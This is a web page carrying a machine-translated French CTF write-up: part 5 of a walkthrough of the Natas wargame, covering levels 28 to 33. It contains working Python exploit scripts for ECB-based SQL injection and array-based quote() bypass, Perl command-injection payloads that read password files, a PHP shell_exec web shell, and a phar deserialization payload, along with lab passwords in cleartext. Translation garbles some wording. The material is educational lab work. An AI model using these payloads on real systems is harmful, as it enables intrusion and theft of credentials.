<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🍫 🥪 📿 Natas Web. Passage de la plateforme CTF visant à exploiter les vulnérabilités du Web. Partie 5 📧 🏳️‍🌈 🧖</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans cet article, nous traiterons du fonctionnement de certaines identités WEB en utilisant le wargame Natas comme exemple. Chaque niveau a accès au m...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Natas Web. Passage de la plateforme CTF visant à exploiter les vulnérabilités du Web. Partie 5</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/465363/"><img src="https://habrastorage.org/webt/_-/zf/_u/_-zf_uvvs6ypsybfrqslsnqwx8k.png" alt="image"><br><br>  Dans cet article, nous traiterons du fonctionnement de certaines identités WEB en utilisant le wargame <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Natas</a> comme exemple.  Chaque niveau a accès au mot de passe de niveau suivant.  Tous les mots de passe sont également stockés dans les fichiers / etc / natas_webpass /.  Par exemple, le mot de passe de natas5 est stocké dans le fichier / etc / natas_webpass / natas5 et est en lecture seule pour les utilisateurs natas4 et natas5. <br><br>  Parties passées: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 1</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 2</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 3</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 4</a> . <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Information organisationnelle</b> <div class="spoiler_text">  Surtout pour ceux qui veulent apprendre quelque chose de nouveau et se développer dans l'un des domaines de l'information et de la sécurité informatique, j'écrirai et parlerai des catégories suivantes: <br><br><ul><li>  PWN; </li><li>  cryptographie (Crypto); </li><li>  technologies de réseau (réseau); </li><li>  reverse (Reverse Engineering); </li><li>  stéganographie (Stegano); </li><li>  recherche et exploitation des vulnérabilités WEB. </li></ul><br>  En plus de cela, je partagerai mon expérience en criminalistique informatique, analyse de logiciels malveillants et micrologiciels, attaques sur les réseaux sans fil et les réseaux locaux, réalisation de pentests et écriture d'exploits. <br><cut></cut><br>  Afin que vous puissiez vous renseigner sur les nouveaux articles, logiciels et autres informations, j'ai créé une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">chaîne dans Telegram</a> et un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">groupe pour discuter de tout problème</a> dans le domaine de l'ICD.  Aussi, je considérerai personnellement vos demandes, questions, suggestions et recommandations <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">personnelles et répondrai à tout le monde</a> . <br><br>  Toutes les informations sont fournies à des fins éducatives uniquement.  L'auteur de ce document n'assume aucune responsabilité pour tout dommage causé à quelqu'un du fait de l'utilisation des connaissances et des méthodes obtenues à la suite de l'étude de ce document. <br></div></div><br><h2>  niveau 28 </h2><br>  En envoyant une requête, nous voyons une redirection vers une autre page avec une requête étrange et un encodage base64, dont le décodage ne donne rien. <br><br><img src="https://habrastorage.org/webt/cf/zj/qx/cfzjqxoth5dlerlwy-jstxfyd3a.png" alt="image"><br><br>  Nous enverrons toute demande de requête.  Nous obtenons une erreur qui indique clairement que la redirection utilise le chiffrement et sur cette page, la demande est déchiffrée avant d'être transférée dans la base de données.  Autrement dit, nous devons crypter notre injection et l'envoyer au serveur, mais nous ne connaissons pas la clé.  Mais nous avons un chiffreur - c'est le serveur. <br><br><img src="https://habrastorage.org/webt/qr/pu/ox/qrpuox4rcgdtxne4znoewsryctm.png" alt="image"><br><br>  Commençons d'abord par le chiffrement.  Nous enverrons deux lignes différentes «qwerty» et «asdfgh» et analyserons comment elles seront converties. <br><br><img src="https://habrastorage.org/webt/7h/d4/yh/7hd4yh_jjeypqqz69jn2eimnrnc.png" alt="image"><br><br>  En réponse, nous obtenons des lignes identiques, qui à un certain endroit ont une séquence distincte.  Étant donné que le début et la fin de deux PC (texte chiffré) sont identiques, nous pouvons tirer les conclusions suivantes: <br><br><ul><li>  Le complément initial à OT est utilisé (texte en clair); </li><li>  il y a un ajout final à OT; </li><li>  Le mode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ECB</a> est utilisé, car à différents OT les derniers blocs du CT sont les mêmes, c'est-à-dire que les blocs sont indépendants les uns des autres. </li></ul><cut></cut><br>  L'idée est la suivante: nous envoyons une requête à la base de données pour le cryptage, mais elle sera convertie et donc, lors du décryptage, l'injection ne passera pas.  Il est nécessaire de traiter avec les modules complémentaires pour calculer avec précision les blocs où notre charge utile sera cryptée.  Ensuite, après le cryptage, nous prendrons nos blocs de la demande et n'enverrons que ceux-ci au serveur.  Sur le serveur, ils seront déchiffrés et, comme ils sont sans modules complémentaires, exécutés. <br><br>  L'idée est présentée en quatre images: <br><br><ol><li>  Présentation de 5 blocs. </li><li>  Un encodeur avec des ajouts de début et de fin qui chiffrent une chaîne vide. </li><li>  Cryptage de la chaîne "TEXTTEXTTEXTTEXT". </li><li>  Nous nous débarrassons des ajouts en ajoutant le nombre de caractères requis avant et après notre ligne pour le mettre dans un bloc séparé.  Nous ne prenons du PC que le deuxième bloc. </li></ol><br><img src="https://habrastorage.org/webt/6x/az/z6/6xazz648f0cgitqajlo-m7eksi0.png" alt="image"><br><br>  De cette façon, nous n'avons reçu que notre chaîne cryptée sur une clé inconnue pour nous !!! <br><br>  Données nécessaires: <br><br><ol><li>  Mode de cryptage (connu - ECB) </li><li>  Longueur de bloc (connue - 16) </li><li>  <b>Longueur initiale du module complémentaire (inconnue)</b> </li><li>  La longueur de notre texte (connue - «SELECT mot de passe <br>  COMME blague des utilisateurs ") </li></ol><br>  Il est nécessaire de connaître la longueur du remplissage initial.  Puisque les deux premiers blocs sont identiques, nous enverrons un nombre différent de caractères, et dès que le troisième bloc cessera de changer, nous trouverons le nombre de caractères nécessaires pour le compléter.  Ce sont 10 caractères.  Voici une implémentation de l'algorithme ci-dessus. <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urlparse <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urlsplit <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urllib2 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> unquote <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ChiperQuery</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, query)</span></span></span><span class="hljs-function">:</span></span> resp = requests.post(url, auth=auth, data={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: query}) query_param = unquote(urlsplit(resp.url)[<span class="hljs-number"><span class="hljs-number">3</span></span>][<span class="hljs-number"><span class="hljs-number">6</span></span>:]) byte_decode_query = bytearray(base64.b64decode(query_param)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> byte_decode_query <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SendPayload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, payload)</span></span></span><span class="hljs-function">:</span></span> enc_payload = base64.b64encode(bytes(payload)) ret = requests.get(url + <span class="hljs-string"><span class="hljs-string">'/search.php'</span></span>, auth=auth, params={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: enc_payload}) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ret.text url = <span class="hljs-string"><span class="hljs-string">"http://natas28.natas.labs.overthewire.org/"</span></span> auth = requests.auth.HTTPBasicAuth(<span class="hljs-string"><span class="hljs-string">"natas28"</span></span>, <span class="hljs-string"><span class="hljs-string">"JWwR438wkgTsNKBbcJoowyysdM82YjeF"</span></span>) query = <span class="hljs-string"><span class="hljs-string">"SELECT password AS joke FROM users"</span></span> query += <span class="hljs-string"><span class="hljs-string">" "</span></span> * (<span class="hljs-number"><span class="hljs-number">16</span></span>-len(query)%<span class="hljs-number"><span class="hljs-number">16</span></span>) plaintext = <span class="hljs-string"><span class="hljs-string">'b'</span></span>*<span class="hljs-number"><span class="hljs-number">10</span></span> + query + chr(<span class="hljs-number"><span class="hljs-number">16</span></span>)*<span class="hljs-number"><span class="hljs-number">16</span></span> chip_query = ChiperQuery(url, auth, plaintext) st_pos = len(query) count = st_pos+<span class="hljs-number"><span class="hljs-number">16</span></span> result = SendPayload(url, auth, chip_query[st_pos:st_pos+count]) print(result)</code> </pre> <br><img src="https://habrastorage.org/webt/hr/7g/jr/hr7gjrd3jg6_nqv_luh8pg1l7fm.png" alt="image"><br><br>  Nous obtenons le mot de passe. <br><br><h2>  niveau 29 </h2><br>  Il est difficile de deviner que le code Perl appelle la fonction de ligne de commande et transmet les commandes spécifiées dans le fichier de données (que vous pouvez sélectionner) à la commande.  Le fait est que nous pouvons fermer le pipeline de "exec |  read_command_file "in" exec |  read_command |  our_smd_command. " <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a21/389/622/a21389622a7c7611aed78ae6678fd996.png" alt="image"><br><br>  Mais le fait est que notre équipe sera affichée sur la console, et non sur le site.  Pour ce faire, ajoutez la commande suivante pour remplacer les caractères dans les flux d'entrée / sortie: «|  tr `avant` après`. <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="image"><br><br>  Puisque la commande est terminée, nous lirons le mot de passe du fichier spécifié.  Mais on nous dit que nous ne pouvons pas faire ça ... <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="image"><br><br>  Nous utiliserons le filtrage en ligne de commande et insérerons des guillemets dans tous les emplacements qui seront effacés lors de l'exécution de la commande. <br><br><img src="https://habrastorage.org/webt/1h/a-/2-/1ha-2-9b0klpqpjytwvshd_6n7u.png" alt="image"><br><br>  Nous enlevons le mot de passe. <br><br><h2>  niveau 30 </h2><br>  Regardons le code source.  La méthode quote () est utilisée ici, ce qui échappe à tous les caractères spéciaux dans une chaîne.  Mais il s'échappe exactement dans la chaîne, ce qui nous donne le droit d'opérer l'injection, si nous avons utilisé, par exemple, un tableau (dans ce cas, un élément zéro sera accepté). <br><br><img src="https://habrastorage.org/webt/6r/2u/zq/6r2uzq4fn67dpsswpqhqihjtuna.png" alt="image"><br><br>  Imaginons une charge pour la demande <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'username'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'password'</span></span>;</code> </pre> <br>  Puisque nous savons que le nom d'utilisateur est natas31, nous introduisons la condition correcte dans le mot de passe: '' ou 1. Ensuite, notre demande deviendra comme ceci <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'natas31'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>;</code> </pre> <br>  Et maintenant, il reste à envoyer un tableau. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests url = <span class="hljs-string"><span class="hljs-string">"http://natas30.natas.labs.overthewire.org/index.pl"</span></span> s = requests.Session() s.auth = (<span class="hljs-string"><span class="hljs-string">'natas30'</span></span>, <span class="hljs-string"><span class="hljs-string">'wie9iexae0Daihohv8vuu3cei9wahf0e'</span></span>) args = { <span class="hljs-string"><span class="hljs-string">"username"</span></span>: <span class="hljs-string"><span class="hljs-string">"natas31"</span></span>, <span class="hljs-string"><span class="hljs-string">"password"</span></span>: [<span class="hljs-string"><span class="hljs-string">"'' or 1"</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>] } r = s.post(url, data=args) print(r.text)</code> </pre> <br><img src="https://habrastorage.org/webt/k6/wz/l8/k6wzl8ddxaiazmonwchc3yqa6q8.png" alt="image"><br><br>  Nous enlevons le mot de passe. <br><br><h2>  niveau 31 </h2><br>  L'essence du service devient immédiatement claire: à partir du fichier csv, nous obtenons la table en html. <br><br><img src="https://habrastorage.org/webt/lu/gy/ob/lugyobitqxvszjjwdv8mgyzze6a.png" alt="image"><br><br>  Voyons le code source. <br><br><img src="https://habrastorage.org/webt/72/h7/jn/72h7jnap6hzndui_h8p_wye_3ku.png" alt="image"><br><br>  Et donc, ce qui est le plus intéressant: c'est la ligne while (&lt;$ file&gt;), tandis que file est la ligne du paramètre.  Ainsi, il est possible d'exécuter le code. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="image"><br><br>  Envoyez n'importe quel fichier csv et interceptez la demande dans Burp Suite. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="image"><br><br>  Ajoutons maintenant la commande comme paramètre. <br><pre> <code class="bash hljs">?/bin/cat%20/etc/natas_webpass/natas32%20|</code> </pre> <br><br><img src="https://habrastorage.org/webt/se/b9/pz/seb9pziilk6q0nyxsnucujmsx1w.png" alt="image"><br><br>  Pour appeler la charge à partir du paramètre, ajoutez les lignes suivantes: <br><br><pre> <code class="plaintext hljs">-----------------------------716973545450730846281908502 Content-Disposition: form-data; name="file"; Content-Type: text/csv ARGV</code> </pre> <br><img src="https://habrastorage.org/webt/-n/fl/ml/-nflmldwytfowae7hvsi8m02fl8.png" alt="image"><br><br><img src="https://habrastorage.org/webt/7k/dx/rd/7kdxrdmfwgzlbbkdyuxt3rstck4.png" alt="image"><br><br>  Nous obtenons le mot de passe. <br><br><h2>  niveau 32 </h2><br>  Nous ouvrons la page où l'on nous dit que nous devons prouver l'exécution du code et exécuter le fichier webroot. <br><br><img src="https://habrastorage.org/webt/eg/it/df/egitdfbigqtdo792neb11yw39o8.png" alt="image"><br><br>  Si vous regardez le code, c'est exactement le même qu'au niveau précédent.  Ensuite, nous exploitons la vulnérabilité comme la dernière fois.  Trouvons le fichier webroot.  Pour ce faire, regardez le répertoire, en utilisant comme charge: ls -la | <br><br><img src="https://habrastorage.org/webt/a-/uy/el/a-uyelts3nbtxtzohnb0hte-t0o.png" alt="image"><br><br>  Obtenez la liste des fichiers.  Webroot n'est pas là, mais il y a un étrange programme getpassword. <br>  Nous le réalisons. <br><br><img src="https://habrastorage.org/webt/iv/iv/8f/iviv8f54cgrlx9j_glp770jng5g.png" alt="image"><br><br><img src="https://habrastorage.org/webt/jz/3j/ok/jz3jok9oavuzhsr3iqric_wodfi.png" alt="image"><br><br>  Nous obtenons le mot de passe pour le dernier niveau. <br><br><img src="https://habrastorage.org/webt/dk/wm/vg/dkwmvgv2nnaaahnlnbbfcr97beo.png" alt="image"><br><br><h2>  niveau 33 </h2><br>  Encore une fois, le formulaire de téléchargement de fichier. <br><br><img src="https://habrastorage.org/webt/mr/e4/hq/mre4hqlkvws3uidhslqgmgvu3va.png" alt="image"><br><br>  Regardons le code source. <br><br><img src="https://habrastorage.org/webt/-f/co/l9/-fcol9z_26on8wkfft6ndoktpny.png" alt="image"><br><br>  Ainsi, nous devons télécharger un fichier d'une taille maximale de 4 Mo sur le serveur et si md5 du contenu du fichier est égal à la valeur de référence, il sera exécuté dans l'interpréteur php.  Nous regardons plus loin.  Nous pouvons contrôler le nom du fichier et son contenu. <br><br><img src="https://habrastorage.org/webt/-e/lm/0g/-elm0gr1nbqnwi7wrm8sazsdcdy.png" alt="image"><br><br>  Je dirai tout de suite qu'il s'agit d'une vulnérabilité complexe que j'ai rencontrée il y a six mois.  Il vise le fait que nous pouvons télécharger un fichier de tout type sur le serveur et que toutes les opérations seront effectuées avec son contenu.  À propos des fichiers phar est écrit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> .  En bref, une archive php spéciale représentant des données sérialisées.  Dans ce cas, la lecture du flux phar entraînera l'exécution de code.  Ainsi, vous pouvez sérialiser le code et l'envoyer au serveur.  Lors du calcul de md5, un flux sera lu - ce qui conduira à l'exécution de code. <br><br>  Créez d'abord un fichier php qui lit le drapeau. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> shell_exec(<span class="hljs-string"><span class="hljs-string">'cat /etc/natas_webpass/natas34'</span></span>); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Téléchargez-le sur le serveur.  N'oubliez pas de changer le nom dans Burp Suite. <br><br><img src="https://habrastorage.org/webt/d9/uk/v5/d9ukv57ubafrgtsvr5now1xevao.png" alt="image"><br><br><img src="https://habrastorage.org/webt/fp/3q/3c/fp3q3cisij3xvyjy6qnzgq0efjc.png" alt="image"><br><br>  Nous obtenons la réponse du serveur ... Ok.  Créez maintenant une archive phar qui, une fois exécutée, changera les valeurs dont nous avons besoin (le hachage sera toujours correct et le nom du fichier qui a déjà été téléchargé sur le serveur).  Nous allons donc passer la vérification et le serveur exécutera shell.php. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Shell</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $filename = <span class="hljs-string"><span class="hljs-string">"shell.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $signature = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $init = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } $phar = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Phar(<span class="hljs-string"><span class="hljs-string">"shell.phar"</span></span>); $phar-&gt;startBuffering(); $phar-&gt;addFromString(<span class="hljs-string"><span class="hljs-string">"123.txt"</span></span>, <span class="hljs-string"><span class="hljs-string">'123'</span></span>); $phar-&gt;setStub(<span class="hljs-string"><span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span></span>); $s = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Shell(); $phar-&gt;setMetadata($s); $phar-&gt;stopBuffering(); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Avant de compiler dans le fichier /etc/php/xx/php.ini, vous devez changer le paramètre phar.readonly sur Off. <br><br><img src="https://habrastorage.org/webt/5b/-f/wn/5b-fwntum8gegivytyszgod64j8.png" alt="image"><br><br>  Ensuite, exécutez php shell.php et nous obtenons le fichier .phar.  Nous l'envoyons au serveur et changeons le nom. <br><br><img src="https://habrastorage.org/webt/wr/mj/vh/wrmjvhey7hmfmlq9lpfgd8bylau.png" alt="image"><br><br>  Nous avons donc les deux fichiers: archive et shell.  Vous devez maintenant faire en sorte que le fichier soit lu à partir de l'archive, ce qui entraînera l'exécution de code. <br><br><img src="https://habrastorage.org/webt/yb/4w/id/yb4widil1bd9xhjzw0cdmgnjsns.png" alt="image"><br><br>  Nous obtenons le mot de passe. <br><br><img src="https://habrastorage.org/webt/jc/9w/oy/jc9woyxlkl8wk6wakkwzxbqzmcg.png" alt="image"><br><br>  C'était le lieu de la Natas.  Vous pouvez nous rejoindre sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Telegram</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr465363/">https://habr.com/ru/post/fr465363/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr465353/index.html">Audit de sécurité ICS</a></li>
<li><a href="../fr465355/index.html">Lorsque «a» n'est pas égal à «a». Dans le sillage d'un hack</a></li>
<li><a href="../fr465357/index.html">Sélection: 9 documents utiles sur l'émigration "professionnelle" aux USA</a></li>
<li><a href="../fr465359/index.html">Huawei CloudCampus: infrastructure de services cloud élevée</a></li>
<li><a href="../fr465361/index.html">Carrefour numérique de Kazan: comment les technologies de sécurité routière sont introduites dans la ville</a></li>
<li><a href="../fr465365/index.html">Script d'installation de Windows 10</a></li>
<li><a href="../fr465367/index.html">Qui ne s'est pas caché - je ne suis pas à blâmer (histoire du secret dans l'aviation)</a></li>
<li><a href="../fr465369/index.html">Réseaux de neurones insensibles au poids (WANN)</a></li>
<li><a href="../fr465371/index.html">Calcul de l'hypothèse nulle, par exemple, l'analyse des salaires des programmeurs ukrainiens</a></li>
<li><a href="../fr465373/index.html">Pas un examen du ASUS ZenBook Pro 15 UX580GE - presque un an avec presque le top</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>